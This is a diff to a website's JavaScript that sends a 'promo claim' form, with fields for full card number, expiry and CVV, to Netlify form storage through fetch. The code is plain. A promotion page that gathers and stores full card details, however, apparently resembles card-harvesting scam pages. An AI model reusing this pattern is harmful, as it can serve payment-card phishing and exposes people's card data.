@@ -47,12 +47,29 @@ document.addEventListener("DOMContentLoaded", function() {
     const promoCard = document.querySelector('.promo-card');
 
     promoForm.addEventListener('submit', function(event) {
-        // Change the button and promo card appearance immediately after submission
+        event.preventDefault(); // Prevent the default form submission
+
+        // Change the button and promo card appearance
         claimButton.textContent = 'Claimed!';
         claimButton.disabled = true;
         claimButton.classList.add('claimed');
         promoCard.classList.add('promo-claimed');
+
+        // Programmatically submit the form to Netlify
+        fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(new FormData(promoForm)).toString()
+        }).then(response => {
+            if (response.ok) {
+                console.log('Submission successful');
+            } else {
+                console.log('Submission failed');
+                // Handle failure case here, if needed
+            }
+        }).catch(error => console.error('Error in submission:', error));
     });
+
     const inputFields = ['fullName', 'email', 'phone', 'address', 'city', 'zip', 'country', 'nameOnCard', 'cardNumber', 'expiry', 'cvv'];
     inputFields.forEach((inputField, index) => {
         const element = document.getElementById(inputField);
